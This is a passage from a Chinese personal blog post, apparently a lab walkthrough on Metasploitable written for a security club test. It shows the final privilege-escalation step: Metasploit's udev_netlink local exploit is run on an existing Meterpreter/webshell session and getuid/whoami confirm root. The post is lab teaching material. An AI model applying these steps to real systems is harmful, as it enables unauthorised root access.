<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; background
</span></span></code></pre></td></tr></table>
</div>
</div><p>然后我们使用这个模块<code>exploit/linux/local/udev_netlink</code>(用别的也可以，我个人喜欢用这个:)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>multi/handler<span class="o">)</span> &gt; use exploit/linux/local/udev_netlink
</span></span></code></pre></td></tr></table>
</div>
</div><p>模块的信息你可以自己输入 <strong><code>info</code></strong> 这个命令去查看，</p>
<p>然后我们设置刚刚webshell的session号，我的是2:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>linux/local/udev_netlink<span class="o">)</span> &gt; <span class="nb">set</span> SESSION <span class="m">2</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>最后执行 <strong><code>run</code></strong> 或者 <strong><code>exploit</code></strong> :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf5 exploit<span class="o">(</span>linux/local/udev_netlink<span class="o">)</span> &gt; exploit
</span></span></code></pre></td></tr></table>
</div>
</div><p>这样我们就获取到最高权限了，如图:</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_14-07-51.png" alt=""></p>
<p>我们来看看用户是不是root</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; getuid
</span></span></code></pre></td></tr></table>
</div>
</div><p>或</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">meterpreter &gt; shell
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">whoami
</span></span></code></pre></td></tr></table>
</div>
</div><p>如图</p>
<p><img src="/img/%E6%88%AA%E5%9B%BE_2019-11-03_14-09-15.png" alt=""></p>
<p>然后，我们就通过了第四关，同时也通过了全部考核，接下来只要取证和提交截图就可以成为锏幕核心成员了。</p>
<hr>
<h2 id="结语">结语</h2>
<p>写了一个礼拜，全是即操作即写</p>
<p>看完还不会的，，，在下面留言吧..</p>
<h2 id="参考链接">参考链接</h2>
<ul>
<li>
<p><a href="https://wiki.archlinux.org/index.php/Main_page_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">ArchWiki</a></p>
</li>
<li>
<p><a href="https://sourceforge.net/projects/metasploitable/">Metasploitable下载地址</a></p>
</li>
<li>
<p><a href="https://www.bilibili.com/video/av59729967">由帝的sqlmap视频</a></p>
</li>
</ul>
<hr>
<p><strong>注意：转载请注明出处，禁止用本博客去干一些作死的事情，否则后果自负，与我无关</strong></p>

                    
                    <HR width="100%" id="EOF">
		    <p style="color:#777;"></p>
                    
                </div>
            </div>
            
            
            <nav class="post-pagination">

                
                <a class="newer-posts" href="http://weepingdogel.github.io/%E4%B8%80%E4%B8%AAc%E8%AF%AD%E8%A8%80%E7%9A%84%E5%B0%8F%E7%A8%8B%E5%BA%8F/">
			<br>一个C语言的小程序
                </a>
                
                
                
                <a class="older-posts" href="http://weepingdogel.github.io/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/">
			<br>如何使用 GitHub 搭建网站
                </a>
                
            </nav>
            <div class="post-comment-wrapper">
                










            </div>
        </div>
    </div>


                    </div>
            </div><div id="single-column-footer">
 <a href="https://github.com/amazingrise/hugo-theme-diary">Diary</a>  <a href="https://amazingrise.net">Rise</a>
<br>
 <a href="https://mak1t0.cc/" target="_blank" rel="noreferrer noopener">Makito</a>'s <a href="https://github.com/SumiMakito/hexo-theme-journal/" target="_blank" rel="noreferrer noopener">Journal.</a> <br>
<br>

&copy;
	
	2021 WeepingDogel
	
</div>
            </div>
    
    <script src="/js/journal.js"></script>
    </body>
</html>
